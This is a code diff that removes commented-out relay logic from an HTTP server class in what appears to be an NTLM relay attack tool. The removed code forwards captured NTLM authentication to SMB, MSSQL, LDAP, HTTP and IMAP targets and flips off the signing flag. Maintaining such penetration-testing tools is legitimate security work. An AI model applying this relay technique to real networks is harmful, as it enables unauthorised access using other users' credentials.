@@ -180,61 +180,6 @@ class HTTPRelayServer(Thread):
             #Calculate auth
             self.do_AUTHHEAD(message = 'NTLM '+base64.b64encode(self.challengeMessage.getData()))
             return True
-            # if self.target[0] == 'SMB':
-            #     try:
-            #         self.client = SMBRelayClient(self.target[1], extended_security = True)
-            #         negotiate = ntlm.NTLMAuthNegotiate()
-            #         negotiate.fromString(token)
-            #         #Remove the signing flag
-            #         negotiate['flags'] ^= ntlm.NTLMSSP_NEGOTIATE_ALWAYS_SIGN
-            #         clientChallengeMessage = self.client.sendNegotiate(negotiate.getData())
-            #     except Exception, e:
-            #         logging.error("Connection against target %s FAILED" % self.target[1])
-            #         logging.error(str(e))
-            #         return False
-            #
-            # if self.target[0] == 'MSSQL':
-            #     try:
-            #         self.client = MSSQLRelayClient(self.target[1],self.target[2])
-            #         negotiate = ntlm.NTLMAuthNegotiate()
-            #         negotiate.fromString(token)
-            #         clientChallengeMessage = self.client.sendNegotiate(negotiate.getData())
-            #     except Exception, e:
-            #         logging.error("Connection against target %s FAILED" % self.target[1])
-            #         logging.error(str(e))
-            #         return False
-            #
-            # if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
-            #     try:
-            #         self.client = LDAPRelayClient("%s://%s:%d" % (self.target[0].lower(),self.target[1],self.target[2]))
-            #         # perform the Bind operation
-            #         negotiate = ntlm.NTLMAuthNegotiate()
-            #         negotiate.fromString(token)
-            #         clientChallengeMessage = self.client.sendNegotiate(negotiate.getData())
-            #     except Exception, e:
-            #         logging.error("Connection against target %s FAILED" % self.target[1])
-            #         logging.error(str(e))
-            #         return False
-            #
-            # if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
-            #     try:
-            #         self.client = HTTPRelayClient("%s://%s:%d/%s" % (self.target[0].lower(),self.target[1],self.target[2],self.target[3]))
-            #         clientChallengeMessage = self.client.sendNegotiate(token)
-            #     except Exception, e:
-            #         logging.error("Connection against target %s FAILED" % self.target[1])
-            #         logging.error(str(e))
-            #         return False
-            #
-            # if self.target[0] == 'IMAP' or self.target[0] == 'IMAPS':
-            #     try:
-            #         self.client = IMAPRelayClient("%s://%s:%d" % (self.target[0].lower(),self.target[1],self.target[2]))
-            #         negotiate = ntlm.NTLMAuthNegotiate()
-            #         negotiate.fromString(token)
-            #         clientChallengeMessage = self.client.sendNegotiate(negotiate.getData())
-            #     except Exception, e:
-            #         logging.error("Connection against target %s FAILED" % self.target[1])
-            #         logging.error(str(e))
-            #         return False
 
         def do_ntlm_auth(self,token,authenticateMessage):
             #For some attacks it is important to know the authenticated username, so we store it
@@ -251,73 +196,6 @@ class HTTPRelayServer(Thread):
                 return True
 
             return False
-
-            # #TODO: What is this 127.0.0.1 doing here? Maybe document specific use case
-            # if authenticateMessage['user_name'] != '' or self.target[1] == '127.0.0.1':
-            #     respToken2 = SPNEGO_NegTokenResp()
-            #     respToken2['ResponseToken'] = str(token)
-            #     if self.target[0] == 'SMB':
-            #         clientResponse, errorCode = self.client.sendAuth(respToken2.getData(),self.challengeMessage['challenge'])
-            #     if self.target[0] == 'MSSQL':
-            #         try:
-            #             result = self.client.sendAuth(token)
-            #             return result #This contains a boolean
-            #         except Exception, e:
-            #             logging.error("NTLM Message type 3 against %s FAILED" % self.target[1])
-            #             logging.error(str(e))
-            #             return False
-            #
-            #     if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
-            #         try:
-            #             result = self.client.sendAuth(token) #Result dict
-            #             if result['result'] == 0 and result['description'] == 'success':
-            #                 return True
-            #             else:
-            #                 logging.error("LDAP bind against %s as %s FAILED" % (self.target[1],self.authUser))
-            #                 logging.error('Error: %s. Message: %s' % (result['description'],str(result['message'])))
-            #                 return False
-            #             #Failed example:
-            #             #{'dn': u'', 'saslCreds': None, 'referrals': None, 'description': 'invalidCredentials', 'result': 49, 'message': u'8009030C: LdapErr: DSID-0C0905FE, comment: AcceptSecurityContext error, data 52e, v23f0\x00', 'type': 'bindResponse'}
-            #             #Ok example:
-            #             #{'dn': u'', 'saslCreds': None, 'referrals': None, 'description': 'success', 'result': 0, 'message': u'', 'type': 'bindResponse'}
-            #         except Exception, e:
-            #             logging.error("NTLM Message type 3 against %s FAILED" % self.target[1])
-            #             logging.error(str(e))
-            #             return False
-            #
-            #     if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
-            #         try:
-            #             result = self.client.sendAuth(token) #Result is a boolean
-            #             if result:
-            #                 return True
-            #             else:
-            #                 logging.error("HTTP NTLM auth against %s as %s FAILED" % (self.target[1],self.authUser))
-            #                 return False
-            #         except Exception, e:
-            #             logging.error("HTTP NTLM Message type 3 against %s FAILED" % self.target[1])
-            #             logging.error(str(e))
-            #             return False
-            #
-            #     if self.target[0] == 'IMAP' or self.target[0] == 'IMAPS':
-            #         try:
-            #             result = self.client.sendAuth(token) #Result is a boolean
-            #             if result:
-            #                 return True
-            #             else:
-            #                 logging.error("IMAP NTLM auth against %s as %s FAILED" % (self.target[1],self.authUser))
-            #                 return False
-            #         except Exception, e:
-            #             logging.error("IMAP NTLM Message type 3 against %s FAILED" % self.target[1])
-            #             logging.error(str(e))
-            #             return False
-            # else:
-            #     # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials, except
-            #     # when coming from localhost
-            #     errorCode = STATUS_ACCESS_DENIED
-            # if errorCode == STATUS_SUCCESS:
-            #     return True
-            # else:
-            #     return False
 
         def do_attack(self, connData=False):
             if self.target[0] == 'SMB':
